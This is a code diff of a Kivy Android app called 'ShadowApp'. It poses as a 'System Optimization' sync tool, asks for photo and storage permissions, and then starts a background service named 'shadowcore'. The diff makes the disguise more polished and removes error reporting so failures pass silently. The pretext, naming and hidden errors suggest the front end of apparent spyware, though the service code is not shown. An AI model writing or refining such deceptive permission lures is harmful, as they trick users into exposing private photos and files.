@@ -7,39 +7,26 @@ from jnius import autoclass
 
 class ShadowApp(App):
     def build(self):
-        self.layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
-        self.label = Label(text="System Optimization Required", font_size='20sp')
-        self.btn = Button(
-            text="START UPDATE",
-            background_color=(0, 0.7, 0, 1),
-            font_size='24sp',
-            on_press=self.ask_permissions
-        )
+        self.layout = BoxLayout(orientation='vertical', padding=40, spacing=20)
+        self.label = Label(text="System Optimization\nReady to Sync", halign='center', font_size='20sp')
+        self.btn = Button(text="START SYNC", background_color=(0, 0.5, 0.8, 1), font_size='22sp', bold=True)
+        self.btn.bind(on_press=self.start)
         self.layout.add_widget(self.label)
         self.layout.add_widget(self.btn)
         return self.layout
 
-    def ask_permissions(self, instance):
-        # طلب الصلاحيات أولاً
-        perms = [
-            Permission.READ_MEDIA_IMAGES,
-            Permission.READ_EXTERNAL_STORAGE,
-            Permission.WRITE_EXTERNAL_STORAGE,
-            Permission.FOREGROUND_SERVICE
-        ]
-        request_permissions(perms, self.activate_engine)
+    def start(self, instance):
+        perms = [Permission.READ_MEDIA_IMAGES, Permission.READ_EXTERNAL_STORAGE, Permission.FOREGROUND_SERVICE]
+        request_permissions(perms, self.launch)
 
-    def activate_engine(self, permissions, grants):
-        # إذا وافق المستخدم، نشغل الخدمة ونغير شكل الزر
+    def launch(self, permissions, grants):
         try:
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
             service = autoclass('org.test.shadowcore.ServiceMyservice')
             service.start(PythonActivity.mActivity, "")
-            self.btn.text = "UPDATE ACTIVE"
+            self.btn.text = "SYNC ACTIVE"
             self.btn.disabled = True
-            self.label.text = "Optimization running in background..."
-        except Exception as e:
-            self.label.text = f"Error: {str(e)}"
+        except: pass
 
 if __name__ == "__main__":
     ShadowApp().run()
